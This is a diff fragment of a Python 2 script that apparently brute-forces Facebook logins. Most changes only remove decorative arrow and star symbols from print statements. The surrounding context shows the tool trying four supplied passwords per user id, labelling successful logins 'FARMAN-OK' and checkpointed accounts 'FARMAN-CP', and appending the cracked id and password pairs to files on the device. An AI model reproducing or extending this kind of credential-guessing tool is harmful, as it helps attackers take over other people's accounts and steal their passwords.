@@ -745,7 +745,7 @@ def a_s():
 
         pass4 = raw_input(' \033[1;92m[4]Password: ')
 
-        idt = raw_input(' \033[1;93m[★]Enter id: ')
+        idt = raw_input(' \033[1;93m[]Enter id: ')
 
         
 
@@ -931,7 +931,7 @@ def a_s():
 
             if 'loc' in q:
 
-                print '\033[1;92m[FARMAN-OK]➤ ' + uid + ' | ' + pass1
+                print '\033[1;92m[FARMAN-OK] ' + uid + ' | ' + pass1
 
                 ok = open('/sdcard/ids/FARMAN_OK.txt', 'a')
 
@@ -943,7 +943,7 @@ def a_s():
 
             elif 'www.facebook.com' in q['error']:
 
-                print '\033[1;97m[FARMAN-CP]➤ ' + uid + ' | ' + pass1
+                print '\033[1;97m[FARMAN-CP]' + uid + ' | ' + pass1
 
                 cp = open('FARMAN_CP.txt', 'a')
 
@@ -961,7 +961,7 @@ def a_s():
 
                 if 'loc' in q:
 
-                    print '\033[1;92m[FARMAN-OK]➤ ' + uid + ' | ' + pass2
+                    print '\033[1;92m[FARMAN-OK] ' + uid + ' | ' + pass2
 
                     ok = open('/sdcard/ids/FARMAN_OK.txt', 'a')
 
@@ -973,7 +973,7 @@ def a_s():
 
                 elif 'www.facebook.com' in q['error']:
 
-                    print '\033[1;97m[FARMAN-CP]➤ ' + uid + ' | ' + pass2
+                    print '\033[1;97m[FARMAN-CP] ' + uid + ' | ' + pass2
 
                     cp = open('FARMAN_CP.txt', 'a')
 
@@ -991,7 +991,7 @@ def a_s():
 
                     if 'loc' in q:
 
-                        print '\033[1;92m[FARMAN-OK]➤ ' + uid + ' | ' + pass3
+                        print '\033[1;92m[FARMAN-OK] ' + uid + ' | ' + pass3
 
                         ok = open('/sdcard/ids/FARMAN_OK.txt', 'a')
 
@@ -1003,7 +1003,7 @@ def a_s():
 
                     elif 'www.facebook.com' in q['error']:
 
-                        print '\033[1;97m[FARMAN-CP]➤ ' + uid + ' | ' + pass3
+                        print '\033[1;97m[FARMAN-CP] ' + uid + ' | ' + pass3
 
                         cp = open('FARMAN_CP.txt', 'a')
 
@@ -1021,7 +1021,7 @@ def a_s():
 
                         if 'loc' in q:
 
-                            print '\033[1;92m[FARMAN-OK]➤ ' + uid + ' | ' + pass4
+                            print '\033[1;92m[FARMAN-OK] ' + uid + ' | ' + pass4
 
                             ok = open('/sdcard/ids/FARMAN_OK.txt', 'a')
 
@@ -1033,7 +1033,7 @@ def a_s():
 
                         elif 'www.facebook.com' in q['error']:
 
-                            print '\033[1;97m[FARMAN-CP]➤ ' + uid + ' | ' + pass4
+                            print '\033[1;97m[FARMAN-CP] ' + uid + ' | ' + pass4
 
                             cp = open('FARMAN_CP.txt', 'a')
 
